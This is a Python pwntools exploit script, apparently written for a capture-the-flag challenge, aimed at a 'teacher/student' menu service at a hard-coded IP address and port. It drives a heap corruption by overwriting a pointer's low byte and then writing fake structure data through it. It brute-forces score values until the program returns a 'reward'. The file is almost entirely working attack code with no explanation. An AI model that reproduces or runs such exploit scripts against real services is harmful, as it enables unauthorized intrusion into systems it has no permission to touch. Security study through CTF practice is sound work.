from pwn import *
import time
import sys
import re

context.log_level = 'info'
context.arch = 'amd64'

HOST = '39.96.193.120'
PORT = 10016

libc = ELF('./pwn4.so')

def try_score(score_val):
    try:
        r = remote(HOST, PORT, timeout=15)
        
        data = r.recv(8192)
        r.sendline(b'0')  # teacher
        time.sleep(0.5)
        r.recv(8192)
        
        # Add 3 students
        for i in range(3):
            r.sendline(b'1')
            time.sleep(0.3)
            r.recv(8192)
            r.sendline(b'9')
            time.sleep(0.3)
            r.recv(8192)
        
        # Give score
        r.sendline(b'2')
        time.sleep(1.5)
        r.recv(8192)
        
        # Switch to student role
        r.sendline(b'5')
        time.sleep(0.3)
        r.recv(8192)
        r.sendline(b'1')
        time.sleep(0.3)
        r.recv(8192)
        
        # Change id to 2
        r.sendline(b'6')
        time.sleep(0.3)
        r.recv(8192)
        r.sendline(b'2')
        time.sleep(0.3)
        r.recv(8192)
        
        # Option 4 (mode=0): allocate chunk at student2+0x10
        r.sendline(b'4')
        time.sleep(0.3)
        r.recv(8192)
        r.sendline(b'A' * 0x20)
        time.sleep(0.3)
        r.recv(8192)
        
        # Set mode=1
        r.sendline(b'3')
        time.sleep(0.3)
        r.recv(8192)
        
        # Option 4 (mode=1): set student2+0x10 low byte
        r.sendline(b'4')
        time.sleep(0.3)
        r.recv(8192)
        r.sendline(str(score_val).encode())
        time.sleep(0.3)
        r.recv(8192)
        
        # Set mode=0
        r.sendline(b'3')
        time.sleep(0.3)
        r.recv(8192)
        
        # Option 4 (mode=0): write to modified address
        # Try writing fake inner data
        fake_inner = p32(9) + p32(100) + p64(0) + p32(0)
        fake_inner = fake_inner.ljust(0x20, b'\x00')
        r.sendline(b'4')
        time.sleep(0.3)
        r.recv(8192)
        r.sendline(fake_inner)
        time.sleep(0.3)
        
        # Check if program is still alive
        r.sendline(b'2')  # pray
        time.sleep(1)
        data = r.recv(4096, timeout=5)
        
        if b'reward' in data:
            log.success(f"Score {score_val}: Got the reward!")
            r.close()
            return True, data
        else:
            log.info(f"Score {score_val}: No reward, data={data[:100]}")
            r.close()
            return False, data
    except Exception as e:
        log.info(f"Score {score_val}: Crash - {e}")
        return False, b''

# Try different score values
for score_val in [48, 64, 80, 96, 16, 32, 0, 4, 8, 12, 20, 24, 28, 36, 40, 44, 52, 56, 60, 68, 72, 76, 84, 88, 92, 100]:
    log.info(f"Trying score={score_val}")
    success, data = try_score(score_val)
    if success:
        log.success(f"Found working score: {score_val}")
        break
    time.sleep(0.5)
